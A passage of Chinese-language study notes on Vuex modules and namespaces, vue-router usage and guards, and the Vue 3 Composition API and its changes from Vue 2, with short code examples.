       ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})

       //靠mapActions生成：incrementOdd、incrementWait（数组形式）
       ...mapActions(['jiaOdd','jiaWait'])
   }
   ```

4. <strong>mapMutations 方法：</strong>用于帮助我们生成与`mutations`对话的方法，即：包含`$store.commit(xxx)`的函数

   ```js
   methods:{
       //靠mapActions生成：increment、decrement（对象形式）
       ...mapMutations({increment:'JIA',decrement:'JIAN'}),
   
       //靠mapMutations生成：JIA、JIAN（对象形式）
       ...mapMutations(['JIA','JIAN']),
   }
   ```

> 备注：mapActions 与 mapMutations 使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。

### 模块化+命名空间

1. 目的：让代码更好维护，让多种数据分类更加明确。

2. 修改`store.js`

   ```javascript
   const countAbout = {
     namespaced:true,//开启命名空间
     state:{x:1},
     mutations: { ... },
     actions: { ... },
     getters: {
       bigSum(state){
          return state.sum * 10
       }
     }
   }

   const personAbout = {
     namespaced:true,//开启命名空间
     state:{ ... },
     mutations: { ... },
     actions: { ... }
   }

   const store = new Vuex.Store({
     modules: {
       countAbout,
       personAbout
     }
   })
   ```

3. 开启命名空间后，组件中读取 state 数据：

   ```js
   //方式一：自己直接读取
   this.$store.state.personAbout.list
   //方式二：借助mapState读取：
   ...mapState('countAbout',['sum','school','subject']),
   ```

4. 开启命名空间后，组件中读取 getters 数据：

   ```js
   //方式一：自己直接读取
   this.$store.getters['personAbout/firstPersonName']
   //方式二：借助mapGetters读取：
   ...mapGetters('countAbout',['bigSum'])
   ```

5. 开启命名空间后，组件中调用 dispatch

   ```js
   //方式一：自己直接dispatch
   this.$store.dispatch('personAbout/addPersonWang',person)
   //方式二：借助mapActions：
   ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   ```

6. 开启命名空间后，组件中调用 commit

   ```js
   //方式一：自己直接commit
   this.$store.commit('personAbout/ADD_PERSON',person)
   //方式二：借助mapMutations：
   ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
   ```

## Vue-router 路由

- vue 的一个插件库，专门用来实现 `SPA` 应用
- 对 SPA 应用的理解
  - 单页 Web 应用（single page web application，SPA）。
  - 整个应用只有一个完整的页面。
  - 点击页面中的导航链接不会刷新页面，只会做页面的局部更新。
  - 数据需要通过 ajax 请求获取.

### Vue-router 的理解

- 一个路由 `route` 就是一组映射关系 `key - value` ，多个路由需要路由器 `router` 进行管理。
- `key` 为路径, `value `可能是 `function` 或 `component`

- 路由分类:
  - 后端路由:
    - 理解：value 是 function, 用于处理客户端提交的请求。
    - 工作过程：服务器接收到一个请求时, 根据请求路径找到匹配的函数来处理请求, 返回响应数据。
  - 前端路由: - 理解：value 是 component，用于展示页面内容。 - 理解：value 是 component，用于展示页面内容。

![alt](./images/21.png)
![alt](./images/22.png)
![alt](./images/23.png)

### Vue-router 基本使用

1. 安装 vue-router，命令：`npm i vue-router`

2. 应用插件：`Vue.use(VueRouter)`

3. 编写 router 配置项:

   ```js
   //引入VueRouter
   import VueRouter from "vue-router";
   //引入Luyou 组件
   import About from "../components/About";
   import Home from "../components/Home";

   //创建router实例对象，去管理一组一组的路由规则
   const router = new VueRouter({
     routes: [
       {
         path: "/about",
         component: About,
       },
       {
         path: "/home",
         component: Home,
       },
     ],
   });

   //暴露router
   export default router;
   ```

4. 实现切换（active-class 可配置高亮样式）

   ```vue
   <router-link active-class="active" to="/about">About</router-link>
   ```

5. 指定展示位置

   ```vue
   <router-view></router-view>
   ```

- **几个注意点**
  - 路由组件通常存放在`pages`文件夹，一般组件通常存放在`components`文件夹。
  - 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
  - 每个组件都有自己的`$route`属性，里面存储着自己的路由信息。
  - 整个应用只有一个 router，可以通过组件的`$router`属性获取到。

### 多级路由

1. 配置路由规则，使用 children 配置项：

   ```js
   routes: [
     {
       path: "/about",
       component: About,
     },
     {
       path: "/home",
       component: Home,
       children: [
         //通过children配置子级路由
         {
           path: "news", //此处一定不要写：/news
           component: News,
         },
         {
           path: "message", //此处一定不要写：/message
           component: Message,
         },
       ],
     },
   ];
   ```

2. 跳转（要写完整路径）：

   ```vue
   <router-link to="/home/news">News</router-link>
   ```

### 路由的 query 参数

1. 传递参数

   ```vue
   <!-- 跳转并携带query参数，to的字符串写法 -->
   <router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>

   <!-- 跳转并携带query参数，to的对象写法 -->
   <router-link
     :to="{
       path: '/home/message/detail',
       query: {
         id: 666,
         title: '你好',
       },
     }"
   >跳转</router-link>
   ```

2. 接收参数：

   ```js
   $route.query.id;
   $route.query.title;
   ```

### 命名路由

1. 作用：可以简化路由的跳转。

2. 如何使用

   1. 给路由命名：

      ```js
      {
       path:'/demo',
       component:Demo,
       children:[
        {
         path:'test',
         component:Test,
         children:[
          {
            name:'hello' //路由命名
            path:'welcome',
            component:Hello,
          }
         ]
        }
       ]
      }
      ```

   2. 简化跳转：

      ```vue
      <!--简化前，需要写完整的路径 -->
      <router-link to="/demo/test/welcome">跳转</router-link>
      
      <!--简化后，直接通过名字跳转 -->
      <router-link :to="{ name: 'hello' }">跳转</router-link>
      
      <!--简化写法配合传递参数 -->
      <router-link
        :to="{
          name: 'hello',
          query: {
            id: 666,
            title: '你好',
          },
        }"
      >跳转</router-link>
      ```

### 路由的 params 参数

1. 配置路由，声明接收 params 参数

   ```js
   {
    path:'/home',
    component:Home,
    children:[
     {
      path:'news',
      component:News
     },
     {
      component:Message,
      children:[
       {
        name:'xiangqing',
        path:'detail/:id/:title', //使用占位符声明接收params参数
        component:Detail
       }
      ]
     }
    ]
   }
   ```

2. 传递参数

   ```vue
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>

   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link
     :to="{
       name: 'xiangqing',
       params: {
         id: 666,
         title: '你好',
       },
     }"
   >跳转</router-link>
   ```

   > 特别注意：路由携带 params 参数时，若使用 to 的对象写法，则不能使用 path 配置项，必须使用 name 配置！

3. 接收参数：

   ```js
   $route.params.id;
   $route.params.title;
   ```

### 路由的 props 配置

 作用：让路由组件更方便的收到参数

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true

	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
}
```

### `<router-link>`的 replace 属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为`push`和`replace`，`push`是追加历史记录，`replace`是替换当前记录。路由跳转时候默认为`push`
3. 如何开启`replace`模式：`<router-link replace .......>News</router-link>`

### 编程式路由导航

1. 作用：不借助`<router-link> `实现路由跳转，让路由跳转更加灵活

2. 具体编码：

   ```js
   //$router的两个API
   this.$router.push({
     name: "xiangqing",
     params: {
       id: xxx,
       title: xxx,
     },
   });
   
   this.$router.replace({
     name: "xiangqing",
     params: {
       id: xxx,
       title: xxx,
     },
   });
   this.$router.forward(); //前进
   this.$router.back(); //后退
   this.$router.go(); //可前进也可后退
   ```

### 缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 具体编码：

   - 缓存单个组件

     ```vue
     <keep-alive include="News"> 
         <router-view></router-view>
     </keep-alive>
     ```

   - 缓存多个组件
     ```vue
     <keep-alive :include="['News', 'Message']">
         <router-view></router-view>
     </keep-alive>
     ```

  

### 路由组件的生命周期钩子

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字：
   1. `activated`路由组件被激活时触发。
   2. `deactivated`路由组件失活时触发。

### 路由守卫

1. 作用：对路由进行权限控制

2. 分类：全局守卫、独享守卫、组件内守卫

3. 全局守卫:

   ```js
   //全局前置守卫：初始化时执行、每次路由切换前执行
   router.beforeEach((to, from, next) => {
     console.log("beforeEach", to, from);
     if (to.meta.isAuth) {
       //判断当前路由是否需要进行权限控制
       if (localStorage.getItem("school") === "atguigu") {
         //权限控制的具体规则
         next(); //放行
       } else {
         alert("暂无权限查看");
         // next({name:'guanyu'})
       }
     } else {
       next(); //放行
     }
   });

   //全局后置守卫：初始化时执行、每次路由切换后执行
   router.afterEach((to, from) => {
     console.log("afterEach", to, from);
     if (to.meta.title) {
       document.title = to.meta.title; //修改网页的title
     } else {
       document.title = "vue_test";
     }
   });
   ```

4. 独享守卫:

   ```js
   beforeEnter(to,from,next){
   	console.log('beforeEnter',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){
   			next()
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next()
   	}
   }
   ```

5. 组件内守卫：

   ```js
   //进入守卫：通过路由规则，进入该组件时被调用
   beforeRouteEnter (to, from, next) {
   },
   //离开守卫：通过路由规则，离开该组件时被调用
   beforeRouteLeave (to, from, next) {
   }
   ```

### 路由器的两种工作模式

1. 对于一个 url 来说，什么是 hash 值？—— #及其后面的内容就是 hash 值。
2. hash 值不会包含在 HTTP 请求中，即：hash 值不会带给服务器。
3. hash 模式：
   1. 地址中永远带着#号，不美观 。
   2. 若以后将地址通过第三方手机 app 分享，若 app 校验严格，则地址会被标记为不合法。
   3. 兼容性较好。
4. history 模式：
   1. 地址干净，美观 。
   2. 兼容性和 hash 模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端 404 的问题。

# Vue3

<img src="https://user-images.githubusercontent.com/499550/93624428-53932780-f9ae-11ea-8d16-af949e16a09f.png" style="width:200px" />



## 1.Vue3简介

- 2020年9月18日，Vue.js发布3.0版本，代号：One Piece（海贼王）
- 耗时2年多、[2600+次提交](https://github.com/vuejs/vue-next/graphs/commit-activity)、[30+个RFC](https://github.com/vuejs/rfcs/tree/master/active-rfcs)、[600+次PR](https://github.com/vuejs/vue-next/pulls?q=is%3Apr+is%3Amerged+-author%3Aapp%2Fdependabot-preview+)、[99位贡献者](https://github.com/vuejs/vue-next/graphs/contributors) 
- github上的tags地址：https://github.com/vuejs/vue-next/releases/tag/v3.0.0

## 2.Vue3带来了什么

### 1.性能的提升

- 打包大小减少41%

- 初次渲染快55%, 更新渲染快133%

- 内存减少54%

  ......

### 2.源码的升级

- 使用Proxy代替defineProperty实现响应式

- 重写虚拟DOM的实现和Tree-Shaking

  ......

### 3.拥抱TypeScript

- Vue3可以更好的支持TypeScript

### 4.新的特性

1. Composition API（组合API）

   - setup配置
   - ref与reactive
   - watch与watchEffect
   - provide与inject
   - ......
2. 新的内置组件
   - Fragment 
   - Teleport
   - Suspense
3. 其他改变

   - 新的生命周期钩子
   - data 选项应始终被声明为一个函数
   - 移除keyCode支持作为 v-on 的修饰符
   - ......

# 一、创建Vue3.0工程

## 1.使用 vue-cli 创建

官方文档：https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create

```bash
## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上
vue --version
## 安装或者升级你的@vue/cli
npm install -g @vue/cli
## 创建
vue create vue_test
## 启动
cd vue_test
npm run serve
```

## 2.使用 vite 创建

官方文档：https://v3.cn.vuejs.org/guide/installation.html#vite

vite官网：https://vitejs.cn

- 什么是vite？—— 新一代前端构建工具。
- 优势如下：
  - 开发环境中，无需打包操作，可快速的冷启动。
  - 轻量快速的热重载（HMR）。
  - 真正的按需编译，不再等待整个应用编译完成。
- 传统构建 与 vite构建对比图

<img src="https://cn.vitejs.dev/assets/bundler.37740380.png" style="width:500px;height:280px;float:left" /><img src="https://cn.vitejs.dev/assets/esm.3070012d.png" style="width:480px;height:280px" />

```bash
## 创建工程
npm init vite-app <project-name>
## 进入工程目录
cd <project-name>
## 安装依赖
npm install
## 运行
npm run dev
```

# 二、常用 Composition API

官方文档: https://v3.cn.vuejs.org/guide/composition-api-introduction.html

## 1.拉开序幕的setup

1. 理解：Vue3.0中一个新的配置项，值为一个函数。
2. setup是所有<strong style="color:#DD5145">Composition API（组合API）</strong><i style="color:gray;font-weight:bold">“ 表演的舞台 ”</i>。
3. 组件中所用到的：数据、方法等等，均要配置在setup中。
4. setup函数的两种返回值：
   1. 若返回一个对象，则对象中的属性、方法, 在模板中均可以直接使用。（重点关注！）
   2. <span style="color:#aad">若返回一个渲染函数：则可以自定义渲染内容。（了解）</span>
5. 注意点：
   1. 尽量不要与Vue2.x配置混用
      - Vue2.x配置（data、methos、computed...）中<strong style="color:#DD5145">可以访问到</strong>setup中的属性、方法。
      - 但在setup中<strong style="color:#DD5145">不能访问到</strong>Vue2.x配置（data、methos、computed...）。
      - 如果有重名, setup优先。
   2. setup不能是一个async函数，因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性。（后期也可以返回一个Promise实例，但需要Suspense和异步组件的配合）

##  2.ref函数

- 作用: 定义一个响应式的数据
- 语法: ```const xxx = ref(initValue)``` 
  - 创建一个包含响应式数据的<strong style="color:#DD5145">引用对象（reference对象，简称ref对象）</strong>。
  - JS中操作数据： ```xxx.value```
  - 模板中读取数据: 不需要.value，直接：```<div>{{xxx}}</div>```
- 备注：
  - 接收的数据可以是：基本类型、也可以是对象类型。
  - 基本类型的数据：响应式依然是靠``Object.defineProperty()``的```get```与```set```完成的。
  - 对象类型的数据：内部 <i style="color:gray;font-weight:bold">“ 求助 ”</i> 了Vue3.0中的一个新函数—— ```reactive```函数。

## 3.reactive函数

- 作用: 定义一个<strong style="color:#DD5145">对象类型</strong>的响应式数据（基本类型不要用它，要用```ref```函数）
- 语法：```const 代理对象= reactive(源对象)```接收一个对象（或数组），返回一个<strong style="color:#DD5145">代理对象（Proxy的实例对象，简称proxy对象）</strong>
- reactive定义的响应式数据是“深层次的”。
- 内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作。

## 4.Vue3.0中的响应式原理

### vue2.x的响应式

- 实现原理：

  - 对象类型：通过```Object.defineProperty()```对属性的读取、修改进行拦截（数据劫持）。

  - 数组类型：通过重写更新数组的一系列方法来实现拦截。（对数组的变更方法进行了包裹）。

    ```js
    Object.defineProperty(data, 'count', {
        get () {}, 
        set () {}
    })
    ```

- 存在问题：

  - 新增属性、删除属性, 界面不会更新。
  - 直接通过下标修改数组, 界面不会自动更新。

### Vue3.0的响应式

- 实现原理: 

  - 通过Proxy（代理）:  拦截对象中任意属性的变化, 包括：属性值的读写、属性的添加、属性的删除等。

  - 通过Reflect（反射）:  对源对象的属性进行操作。

  - MDN文档中描述的Proxy与Reflect：

    - Proxy：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy

    - Reflect：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect

      ```js
      new Proxy(data, {
      	// 拦截读取属性值
          get (target, prop) {
          	return Reflect.get(target, prop)
          },
          // 拦截设置属性值或添加新属性
          set (target, prop, value) {
          	return Reflect.set(target, prop, value)
          },
          // 拦截删除属性
          deleteProperty (target, prop) {
          	return Reflect.deleteProperty(target, prop)
          }
      })
      
      proxy.name = 'tom'   
      ```

## 5.reactive对比ref

-  从定义数据角度对比：
   -  ref用来定义：<strong style="color:#DD5145">基本类型数据</strong>。
   -  reactive用来定义：<strong style="color:#DD5145">对象（或数组）类型数据</strong>。
   -  备注：ref也可以用来定义<strong style="color:#DD5145">对象（或数组）类型数据</strong>, 它内部会自动通过```reactive```转为<strong style="color:#DD5145">代理对象</strong>。
-  从原理角度对比：
   -  ref通过``Object.defineProperty()``的```get```与```set```来实现响应式（数据劫持）。
   -  reactive通过使用<strong style="color:#DD5145">Proxy</strong>来实现响应式（数据劫持）, 并通过<strong style="color:#DD5145">Reflect</strong>操作<strong style="color:orange">源对象</strong>内部的数据。
-  从使用角度对比：
   -  ref定义的数据：操作数据<strong style="color:#DD5145">需要</strong>```.value```，读取数据时模板中直接读取<strong style="color:#DD5145">不需要</strong>```.value```。
   -  reactive定义的数据：操作数据与读取数据：<strong style="color:#DD5145">均不需要</strong>```.value```。

## 6.setup的两个注意点

- setup执行的时机
  - 在beforeCreate之前执行一次，this是undefined。

- setup的参数
  - props：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性。
  - context：上下文对象
    - attrs: 值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性, 相当于 ```this.$attrs```。
    - slots: 收到的插槽内容, 相当于 ```this.$slots```。
    - emit: 分发自定义事件的函数, 相当于 ```this.$emit```。


## 7.计算属性与监视

### 1.computed函数

- 与Vue2.x中computed配置功能一致

- 写法

  ```js
  import {computed} from 'vue'
  
  setup(){
      ...
  	//计算属性——简写
      let fullName = computed(()=>{
          return person.firstName + '-' + person.lastName
      })
      //计算属性——完整
      let fullName = computed({
          get(){
              return person.firstName + '-' + person.lastName
          },
          set(value){
              const nameArr = value.split('-')
              person.firstName = nameArr[0]
              person.lastName = nameArr[1]
          }
      })
  }
  ```

### 2.watch函数

- 与Vue2.x中watch配置功能一致

- 两个小“坑”：

  - 监视reactive定义的响应式数据时：oldValue无法正确获取、强制开启了深度监视（deep配置失效）。
  - 监视reactive定义的响应式数据中某个属性时：deep配置有效。

  ```js
  //情况一：监视ref定义的响应式数据
  watch(sum,(newValue,oldValue)=>{
  	console.log('sum变化了',newValue,oldValue)
  },{immediate:true})
  
  //情况二：监视多个ref定义的响应式数据
  watch([sum,msg],(newValue,oldValue)=>{
  	console.log('sum或msg变化了',newValue,oldValue)
  }) 
  
  /* 情况三：监视reactive定义的响应式数据
  			若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！
  			若watch监视的是reactive定义的响应式数据，则强制开启了深度监视 
  */
  watch(person,(newValue,oldValue)=>{
  	console.log('person变化了',newValue,oldValue)
  },{immediate:true,deep:false}) //此处的deep配置不再奏效
  
  //情况四：监视reactive定义的响应式数据中的某个属性
  watch(()=>person.job,(newValue,oldValue)=>{
  	console.log('person的job变化了',newValue,oldValue)
  },{immediate:true,deep:true}) 
  
  //情况五：监视reactive定义的响应式数据中的某些属性
  watch([()=>person.job,()=>person.name],(newValue,oldValue)=>{
  	console.log('person的job变化了',newValue,oldValue)
  },{immediate:true,deep:true})
  
  //特殊情况
  watch(()=>person.job,(newValue,oldValue)=>{
      console.log('person的job变化了',newValue,oldValue)
  },{deep:true}) //此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效
  ```

### 3.watchEffect函数

- watch的套路是：既要指明监视的属性，也要指明监视的回调。

- watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。

- watchEffect有点像computed：

  - 但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。
  - 而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。

  ```js
  //watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。
  watchEffect(()=>{
      const x1 = sum.value
      const x2 = person.age
      console.log('watchEffect配置的回调执行了')
  })
  ```

## 8.生命周期

<div style="border:1px solid black;width:300px;height:500px;float:left;margin-right:20px;"><strong>vue2.x的生命周期</strong><img src="https://cn.vuejs.org/images/lifecycle.png" alt="lifecycle_2" style="zoom:33%;width:1200px" /></div>
<div style="border:1px solid black;width:300px;height:500px;float:left"><strong>vue3.0的生命周期</strong><img src="https://v3.cn.vuejs.org/images/lifecycle.svg" alt="lifecycle_2" style="zoom:33%;width:1000px" /></div>





































1

- Vue3.0中可以继续使用Vue2.x中的生命周期钩子，但有有两个被更名：
  - ```beforeDestroy```改名为 ```beforeUnmount```
  - ```destroyed```改名为 ```unmounted```
- Vue3.0也提供了 Composition API 形式的生命周期钩子，与Vue2.x中钩子对应关系如下：
  - `beforeCreate`===>`setup()`
  - `created`=======>`setup()`
  - `beforeMount` ===>`onBeforeMount`
  - `mounted`=======>`onMounted`
  - `beforeUpdate`===>`onBeforeUpdate`
  - `updated` =======>`onUpdated`
  - `beforeUnmount` ==>`onBeforeUnmount`
  - `unmounted` =====>`onUnmounted`

## 9.自定义hook函数

- 什么是hook？—— 本质是一个函数，把setup函数中使用的Composition API进行了封装。

- 类似于vue2.x中的mixin。

- 自定义hook的优势: 复用代码, 让setup中的逻辑更清楚易懂。



## 10.toRef

- 作用：创建一个 ref 对象，其value值指向另一个对象中的某个属性。
- 语法：```const name = toRef(person,'name')```
- 应用:   要将响应式对象中的某个属性单独提供给外部使用时。


- 扩展：```toRefs``` 与```toRef```功能一致，但可以批量创建多个 ref 对象，语法：```toRefs(person)```
- 

# 三、其它 Composition API

## 1.shallowReactive 与 shallowRef

- shallowReactive：只处理对象最外层属性的响应式（浅响应式）。
- shallowRef：只处理基本数据类型的响应式, 不进行对象的响应式处理。

- 什么时候使用?
  -  如果有一个对象数据，结构比较深, 但变化时只是外层属性变化 ===> shallowReactive。
  -  如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换 ===> shallowRef。

## 2.readonly 与 shallowReadonly

- readonly: 让一个响应式数据变为只读的（深只读）。
- shallowReadonly：让一个响应式数据变为只读的（浅只读）。
- 应用场景: 不希望数据被修改时。

## 3.toRaw 与 markRaw

- toRaw：
  - 作用：将一个由```reactive```生成的<strong style="color:orange">响应式对象</strong>转为<strong style="color:orange">普通对象</strong>。
  - 使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。
- markRaw：
  - 作用：标记一个对象，使其永远不会再成为响应式对象。
  - 应用场景:
    1. 有些值不应被设置为响应式的，例如复杂的第三方类库等。
    2. 当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。

## 4.customRef

- 作用：创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制。

- 实现防抖效果：

  ```vue
  <template>
  	<input type="text" v-model="keyword">
  	<h3>{{keyword}}</h3>
  </template>
  
  <script>
  	import {ref,customRef} from 'vue'
  	export default {
  		name:'Demo',
  		setup(){
  			// let keyword = ref('hello') //使用Vue准备好的内置ref
  			//自定义一个myRef
  			function myRef(value,delay){
  				let timer
  				//通过customRef去实现自定义
  				return customRef((track,trigger)=>{
  					return{
  						get(){
  							track() //告诉Vue这个value值是需要被“追踪”的
  							return value
  						},
  						set(newValue){
  							clearTimeout(timer)
  							timer = setTimeout(()=>{
  								value = newValue
  								trigger() //告诉Vue去更新界面
  							},delay)
  						}
  					}
  				})
  			}
  			let keyword = myRef('hello',500) //使用程序员自定义的ref
  			return {
  				keyword
  			}
  		}
  	}
  </script>
  ```

  

## 5.provide 与 inject

<img src="https://v3.cn.vuejs.org/images/components_provide.png" style="width:300px" />

- 作用：实现<strong style="color:#DD5145">祖与后代组件间</strong>通信

- 套路：父组件有一个 `provide` 选项来提供数据，后代组件有一个 `inject` 选项来开始使用这些数据

- 具体写法：

  1. 祖组件中：

     ```js
     setup(){
     	......
         let car = reactive({name:'奔驰',price:'40万'})
         provide('car',car)
         ......
     }
     ```

  2. 后代组件中：

     ```js
     setup(props,context){
     	......
         const car = inject('car')
         return {car}
     	......
     }
     ```

## 6.响应式数据的判断

- isRef: 检查一个值是否为一个 ref 对象
- isReactive: 检查一个对象是否是由 `reactive` 创建的响应式代理
- isReadonly: 检查一个对象是否是由 `readonly` 创建的只读代理
- isProxy: 检查一个对象是否是由 `reactive` 或者 `readonly` 方法创建的代理

# 四、Composition API 的优势

## 1.Options API 存在的问题

使用传统OptionsAPI中，新增或者修改一个需求，就需要分别在data，methods，computed里修改 。

<div style="width:600px;height:370px;overflow:hidden;float:left">
    <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f84e4e2c02424d9a99862ade0a2e4114~tplv-k3u1fbpfcp-watermark.image" style="width:600px;float:left" />
</div>
<div style="width:300px;height:370px;overflow:hidden;float:left">
    <img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e5ac7e20d1784887a826f6360768a368~tplv-k3u1fbpfcp-watermark.image" style="zoom:50%;width:560px;left" /> 
</div>
















## 2.Composition API 的优势

我们可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起。

<div style="width:500px;height:340px;overflow:hidden;float:left">
    <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bc0be8211fc54b6c941c036791ba4efe~tplv-k3u1fbpfcp-watermark.image"style="height:360px"/>
</div>
<div style="width:430px;height:340px;overflow:hidden;float:left">
    <img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6cc55165c0e34069a75fe36f8712eb80~tplv-k3u1fbpfcp-watermark.image"style="height:360px"/>
</div>














# 五、新的组件

## 1.Fragment

- 在Vue2中: 组件必须有一个根标签
- 在Vue3中: 组件可以没有根标签, 内部会将多个标签包含在一个Fragment虚拟元素中
- 好处: 减少标签层级, 减小内存占用

## 2.Teleport

- 什么是Teleport？—— `Teleport` 是一种能够将我们的<strong style="color:#DD5145">组件html结构</strong>移动到指定位置的技术。

  ```vue
  <teleport to="移动位置">
  	<div v-if="isShow" class="mask">
  		<div class="dialog">
  			<h3>我是一个弹窗</h3>
  			<button @click="isShow = false">关闭弹窗</button>
  		</div>
  	</div>
  </teleport>
  ```

## 3.Suspense

- 等待异步组件时渲染一些额外内容，让应用有更好的用户体验

- 使用步骤：

  - 异步引入组件

    ```js
    import {defineAsyncComponent} from 'vue'
    const Child = defineAsyncComponent(()=>import('./components/Child.vue'))
    ```

  - 使用```Suspense```包裹组件，并配置好```default``` 与 ```fallback```

    ```vue
    <template>
    	<div class="app">
    		<h3>我是App组件</h3>
    		<Suspense>
    			<template v-slot:default>
    				<Child/>
    			</template>
    			<template v-slot:fallback>
    				<h3>加载中.....</h3>
    			</template>
    		</Suspense>
    	</div>
    </template>
    ```

# 六、其他

## 1.全局API的转移

- Vue 2.x 有许多全局 API 和配置。

  - 例如：注册全局组件、注册全局指令等。

    ```js
    //注册全局组件
    Vue.component('MyButton', {
      data: () => ({
        count: 0
      }),
      template: '<button @click="count++">Clicked {{ count }} times.</button>'
    })
    
    //注册全局指令
    Vue.directive('focus', {
      inserted: el => el.focus()
    }
    ```

- Vue3.0中对这些API做出了调整：

  - 将全局的API，即：```Vue.xxx```调整到应用实例（```app```）上

    | 2.x 全局 API（```Vue```） | 3.x 实例 API (`app`)                        |
    | ------------------------- | ------------------------------------------- |
    | Vue.config.xxxx           | app.config.xxxx                             |
    | Vue.config.productionTip  | <strong style="color:#DD5145">移除</strong> |
    | Vue.component             | app.component                               |
    | Vue.directive             | app.directive                               |
    | Vue.mixin                 | app.mixin                                   |
    | Vue.use                   | app.use                                     |
    | Vue.prototype             | app.config.globalProperties                 |

## 2.其他改变

- data选项应始终被声明为一个函数。

- 过度类名的更改：

  - Vue2.x写法

    ```css
    .v-enter,
    .v-leave-to {
      opacity: 0;
    }
    .v-leave,
    .v-enter-to {
      opacity: 1;
    }
    ```

  - Vue3.x写法

    ```css
    .v-enter-from,
    .v-leave-to {
      opacity: 0;
    }
    
    .v-leave-from,
    .v-enter-to {
      opacity: 1;
    }
    ```

- <strong style="color:#DD5145">移除</strong>keyCode作为 v-on 的修饰符，同时也不再支持```config.keyCodes```

- <strong style="color:#DD5145">移除</strong>```v-on.native```修饰符

  - 父组件中绑定事件

    ```vue
    <my-component
      v-on:close="handleComponentEvent"
      v-on:click="handleNativeClickEvent"
    />
    ```

  - 子组件中声明自定义事件

    ```vue
    <script>
      export default {
        emits: ['close']
      }
    </script>
    ```

- <strong style="color:#DD5145">移除</strong>过滤器（filter）

  > 过滤器虽然这看起来很方便，但它需要一个自定义语法，打破大括号内表达式是 “只是 JavaScript” 的假设，这不仅有学习成本，而且有实现成本！建议用方法调用或计算属性去替换过滤器。

- ......
